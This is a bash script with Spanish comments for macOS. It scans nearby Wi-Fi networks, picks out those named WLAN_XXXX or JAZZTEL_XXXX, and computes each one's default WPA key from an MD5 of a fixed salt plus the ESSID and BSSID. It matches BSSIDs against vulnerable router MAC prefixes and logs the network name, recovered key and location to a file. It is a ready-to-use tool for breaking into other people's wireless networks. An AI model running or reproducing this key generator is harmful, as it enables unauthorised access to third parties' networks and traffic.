#!/bin/bash

## Generador de claves JAZZTEL_XXXX y WLAN_XXXX
## aabilio@gmail.com. Modificado para Mac por Kour2k
## License: http://en.wikipedia.org/wiki/WTFPL



function sacar_claves ()
{
    #Pasar a mayúsculas el wlan_xxxx y coger solo los "xxxx"                                                                                 
    ESSId=$(echo -n "$1" | tr 'a-z' 'A-Z' | cut -d_ -f2)
    #Pasar a mayúsculas el XX:XX:XX:XX:XX y quitar los dos puntos ":"                                               
    BSSId=$(echo -n "$2" | tr 'a-z' 'A-Z' | tr -d :)
    #Cogemos del BSSId solo los 8 primeros caracteres:                                            
    BSSId8=$(echo -n "$BSSId" | cut -c-8)
    #Hacemos la suma md5 de bcgbghgg$BSSId8$ESSId$BSSId (20 primeros caracteres):                                        
    CLAVE=$(echo -n bcgbghgg$BSSId8$ESSId$BSSId | md5 | cut -c-20) 
}

function mostrar_claves ()
{
    echo -e $1 "\t" $2 "\t" $3 "\t" $4

}


################################ MAIN ##################################
#Comprobamos errores de lanzamiento:
# - Argumentos distinto de dos:                                                                                                                                                                                                            
UBICACION=$1
rm /tmp/wifi.* /tmp/uniq.* 2> /dev/null
WIFI_TEMP=`mktemp /tmp/wifi.XXXXXX`
LISTADO="autokey.txt"
UNIQ_TMP=`mktemp /tmp/uniq.XXXXXX`

if [ $# -ne 1 ]                                                                 
then                                                                             
    echo
    echo "Usage: $0 <UBICACION>"
    echo "    Example: $0 CASA"
    rm $UNIQ_TMP
    rm $WIFI_TEMP
    exit 1
fi


/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s|grep -E "WLAN_.... |JAZZTEL_.... "|awk '{print $1";"$2}' > $WIFI_TEMP
#/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s|grep "JAZZTEL_.... "|awk '{print $1";"$2}' >> $WIFI_TEMP
cp $LISTADO $UNIQ_TMP
#WIFIS=`grep -i -E "64:68:C0|00:1D:20|00:23:F8|38:72:C0|00:1B:20|64:68:0C" $WIFI_TEMP|wc -l|awk '{print $1}'`
#echo "Se han encontrado " $WIFIS  " vulnerables"
vulnerables=0
novulnerables=0
for i in `cat $WIFI_TEMP`; do
    ESSID=`echo $i|awk 'BEGIN{FS=";"}{print $1}'`
    BSSID=`echo $i|awk 'BEGIN{FS=";"}{print $2}'`
    echo $BSSID|grep -i -E "64:68:C0|00:1D:20|00:23:F8|38:72:C0|00:1B:20|64:68:0C" > /dev/null
    if [ $? ]; then
        echo -n "*">> $UNIQ_TMP;
       (( novulnerables += 1 ))

    else
         echo "LOCALIZADA RED VULNERABLE" $ESSID
        (( vulnerables += 1 ))
    fi
    sacar_claves $ESSID $BSSID
    mostrar_claves $ESSID $CLAVE $BSSID $UBICACION >> $UNIQ_TMP
#    echo "LOCALIZADO ESSID " $ESSID
done
    sort -u $UNIQ_TMP > $LISTADO
    echo "Se han encontrado " $vulnerables  " redes vulnerables y" $novulnerables "no vulnerables a este ataque"
rm $UNIQ_TMP
rm $WIFI_TEMP
                                                                                                                           
